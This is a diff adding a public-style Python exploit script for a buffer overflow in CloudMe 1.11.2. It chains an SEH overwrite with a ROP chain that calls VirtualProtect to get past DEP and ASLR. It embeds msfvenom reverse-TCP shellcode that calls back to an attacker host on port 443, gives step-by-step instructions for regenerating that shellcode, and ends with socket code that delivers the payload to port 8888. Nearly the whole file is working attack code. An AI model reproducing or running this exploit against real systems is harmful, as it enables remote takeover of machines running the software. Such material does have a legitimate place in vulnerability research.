@@ -1,0 +1,126 @@
+# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (SEH,DEP,ASLR)
+# Date: 2020-05-20
+# Exploit Author: Xenofon Vassilakopoulos
+# Vendor Homepage: https://www.cloudme.com/en
+# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
+# Version: CloudMe 1.11.2
+# Tested on: Windows 7 Professional x86 SP1
+
+# Steps to reproduce:
+# 1. On your local machine start the CloudMe service.
+# 2. change the reverse tcp shellcode using the IP and Port of your host using the following command
+# msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+# 3. Run the python script.
+
+
+import struct
+import socket
+
+target = "127.0.0.1"
+
+########################################################################
+
+# Get kernel32 address from the stack
+# 0022ff8c  77883c45 kernel32!BaseThreadInitThunk+0xe
+
+rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
+rop+= struct.pack('L',0x0385FF88) # Offset
+rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x0362fffc) # Offset
+rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
+
+# Calculate VirtualProtect relative to the leaked kernel32 address
+
+rop+= struct.pack('L',0x68a812c9) # POP EBP # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0xfffae493) # Offset
+rop+= struct.pack('L',0x61ba8137) # ADD EAX,EBP # RETN [Qt5Gui.dll]
+
+########################################################################
+
+# Setup VirtualProtect
+
+# edi
+rop+= struct.pack('L',0x6d9c23ab) # POP EDI # RETN [Qt5Sql.dll]
+rop+= struct.pack('L',0x6d9c1011) # RETN (ROP NOP) [Qt5Sql.dll]
+
+# esi
+rop+= struct.pack('L',0x61b63b3c) # XCHG EAX, ESI # RETN # ptr to virtualprotect
+
+# edx
+rop+= struct.pack('L',0x68d327ff) # POP EAX # POP ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0xffffffc0) # Value to negate, will become 0x00000040
+rop+= struct.pack('L',0x41414141) # Filler
+rop+= struct.pack('L',0x68cef5b2) # NEG EAX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68b1df17) # XCHG EAX,EDX # RETN [Qt5Core.dll]
+
+# ebx
+rop+= struct.pack('L',0x68ae7ee3) # POP EAX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0xfffffdff) # Value to negate, will become 0x00000201
+rop+= struct.pack('L',0x6d9e431a) # NEG EAX # RETN [Qt5Sql.dll]
+rop+= struct.pack('L',0x68aad07c) # XCHG EAX,EBX # RETN [Qt5Core.dll]
+
+# ebp
+rop+= struct.pack('L',0x6d9c12c9) # POP EBP # RETN [Qt5Sql.dll]
+rop+= struct.pack('L',0x6d9c12c9) # skip 4 bytes 
+
+# eax & ecx
+rop+= struct.pack('L',0x6fe4dc57) # POP EAX # POP ECX # RETN [libstdc++-6.dll]
+rop+= struct.pack('L',0x90909090) # NOP      
+rop+= struct.pack('L',0x68ee6b16) # &Writable location [Qt5Core.dll]
+
+# push registers to stack
+rop+= struct.pack('L',0x68ef1b07) # PUSHAD # RETN [Qt5Core.dll]
+
+rop+= struct.pack('L',0x64b4d6cd) # JMP ESP [libwinpthread-1.dll]
+
+
+#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.6 LPORT=443 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+buf =  b""
+buf += b"\xbf\xa4\x90\x9d\x67\xd9\xc7\xd9\x74\x24\xf4\x5a\x31"
+buf += b"\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04\x03\xde\x9e\x7f"
+buf += b"\x92\xe2\x77\xfd\x5d\x1a\x88\x62\xd7\xff\xb9\xa2\x83"
+buf += b"\x74\xe9\x12\xc7\xd8\x06\xd8\x85\xc8\x9d\xac\x01\xff"
+buf += b"\x16\x1a\x74\xce\xa7\x37\x44\x51\x24\x4a\x99\xb1\x15"
+buf += b"\x85\xec\xb0\x52\xf8\x1d\xe0\x0b\x76\xb3\x14\x3f\xc2"
+buf += b"\x08\x9f\x73\xc2\x08\x7c\xc3\xe5\x39\xd3\x5f\xbc\x99"
+buf += b"\xd2\x8c\xb4\x93\xcc\xd1\xf1\x6a\x67\x21\x8d\x6c\xa1"
+buf += b"\x7b\x6e\xc2\x8c\xb3\x9d\x1a\xc9\x74\x7e\x69\x23\x87"
+buf += b"\x03\x6a\xf0\xf5\xdf\xff\xe2\x5e\xab\x58\xce\x5f\x78"
+buf += b"\x3e\x85\x6c\x35\x34\xc1\x70\xc8\x99\x7a\x8c\x41\x1c"
+buf += b"\xac\x04\x11\x3b\x68\x4c\xc1\x22\x29\x28\xa4\x5b\x29"
+buf += b"\x93\x19\xfe\x22\x3e\x4d\x73\x69\x57\xa2\xbe\x91\xa7"
+buf += b"\xac\xc9\xe2\x95\x73\x62\x6c\x96\xfc\xac\x6b\xd9\xd6"
+buf += b"\x09\xe3\x24\xd9\x69\x2a\xe3\x8d\x39\x44\xc2\xad\xd1"
+buf += b"\x94\xeb\x7b\x75\xc4\x43\xd4\x36\xb4\x23\x84\xde\xde"
+buf += b"\xab\xfb\xff\xe1\x61\x94\x6a\x18\xe2\x5b\xc2\x23\xf4"
+buf += b"\x33\x11\x23\xf9\x78\x9c\xc5\x93\x6e\xc9\x5e\x0c\x16"
+buf += b"\x50\x14\xad\xd7\x4e\x51\xed\x5c\x7d\xa6\xa0\x94\x08"
+buf += b"\xb4\x55\x55\x47\xe6\xf0\x6a\x7d\x8e\x9f\xf9\x1a\x4e"
+buf += b"\xe9\xe1\xb4\x19\xbe\xd4\xcc\xcf\x52\x4e\x67\xed\xae"
+buf += b"\x16\x40\xb5\x74\xeb\x4f\x34\xf8\x57\x74\x26\xc4\x58"
+buf += b"\x30\x12\x98\x0e\xee\xcc\x5e\xf9\x40\xa6\x08\x56\x0b"
+buf += b"\x2e\xcc\x94\x8c\x28\xd1\xf0\x7a\xd4\x60\xad\x3a\xeb"
+buf += b"\x4d\x39\xcb\x94\xb3\xd9\x34\x4f\x70\xf9\xd6\x45\x8d"
+buf += b"\x92\x4e\x0c\x2c\xff\x70\xfb\x73\x06\xf3\x09\x0c\xfd"
+buf += b"\xeb\x78\x09\xb9\xab\x91\x63\xd2\x59\x95\xd0\xd3\x4b"
+
+##########
+
+junk1 = "\x41"*1604
+
+nops = "\x90"*16
+
+junk2 = "C"*(2236 - len(nops) - len(buf) - len(rop) - len(junk1))
+
+seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN  [Qt5Network.dll] 
+
+payload = junk1 + rop + nops + buf + junk2 + seh 
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,8888))
+	s.send(payload)
+except Exception as e:
+	print(sys.exc_value)
